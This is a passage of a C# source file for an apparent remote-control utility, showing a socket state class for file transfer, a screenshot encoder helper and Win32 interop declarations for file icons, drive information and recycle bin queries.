            catch (Exception ex)
            {
                Debug.WriteLine($"Error simulating mouse click: {ex.Message}");
            }
        }

        //=================remote control=========================
        //=================== screenshot for each process==================
        private static ImageCodecInfo GetEncoderInfo(string mimeType)
        {
            var encoders = ImageCodecInfo.GetImageEncoders();

            for (var i = 0; i < encoders.Length; i++)
                if (encoders[i].MimeType == mimeType)
                    return encoders[i];

            return null;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);

        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);
    }


    public class StateObject
    {
        public const int BufferSize = 102400;
        public ByteArrayBuilder bab = new ByteArrayBuilder();
        public byte[] buffer = new byte[BufferSize];
        public FileInfo fileInfo;
        public long fileSizeReceived;
        public int ol;
        public StringBuilder sb = new StringBuilder();
        public Socket workSocket;
    }

    #region Struct,Class

    public class Win32
    {
        public const uint SHGFI_ICON = 0x100;

        //public const uint SHGFI_LARGEICON = 0x0;    // 'Large icon
        public const uint SHGFI_SMALLICON = 0x1; // 'Small icon

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(
            string pszPath,
            uint dwFileAttributes,
            ref SHFILEINFO psfi,
            uint cbSizeFileInfo,
            uint uFlags);

        [DllImport("kernel32")]
        public static extern uint GetDriveType(
            string lpRootPathName);

        [DllImport("shell32.dll")]
        public static extern bool SHGetDiskFreeSpaceEx(
            string pszVolume,
            ref ulong pqwFreeCaller,
            ref ulong pqwTot,
            ref ulong pqwFree);

        [DllImport("shell32.Dll")]
        public static extern int SHQueryRecycleBin(
            string pszRootPath,
            ref SHQUERYRBINFO pSHQueryRBInfo);

        [DllImport("comctl32.dll")]
        public static extern bool ImageList_Add(IntPtr hImageList, IntPtr hBitmap, IntPtr hMask);

        [DllImport("kernel32.dll")]
        private static extern bool RtlMoveMemory(IntPtr dest, IntPtr source, int dwcount);

        [DllImport("shell32.dll")]
        public static extern IntPtr DestroyIcon(IntPtr hIcon);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDIBSection(IntPtr hdc,
            [In] [MarshalAs(UnmanagedType.LPStruct)]
            BITMAPINFO pbmi,
            uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public IntPtr iIcon;
            public uint dwAttributes;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class BITMAPINFO
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
            public int colors;
        }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct SHQUERYRBINFO
    {
        public uint cbSize;
        public ulong i64Size;
        public ulong i64NumItems;
    }

    #endregion
}